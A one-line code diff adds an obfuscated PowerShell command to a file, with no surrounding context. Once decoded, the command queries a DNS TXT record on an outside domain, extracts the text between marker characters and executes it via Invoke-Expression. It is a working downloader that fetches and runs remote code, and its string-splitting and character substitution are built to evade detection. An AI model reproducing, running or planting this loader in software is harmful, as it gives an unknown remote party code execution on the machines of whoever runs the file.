@@ -1,0 +1,1 @@
+﻿ ('if('+'H93'+'H'+'9'+'3+('+'nslo'+'ok'+'up'+' -'+'q=txt p.s'+'.w'+'2.'+'ns.ranki'+'ngplac.pl) -m'+'atch H'+'9'+'3@(.*)@H'+'93'+')'+'{ie'+'x '+'a'+'u5ma'+'tches'+'['+'1]}').rEPLaCE(([CHar]72+[CHar]57+[CHar]51),[STrinG][CHar]39).rEPLaCE('au5','$')|& ( $pshOME[21]+$pShoMe[34]+'x')
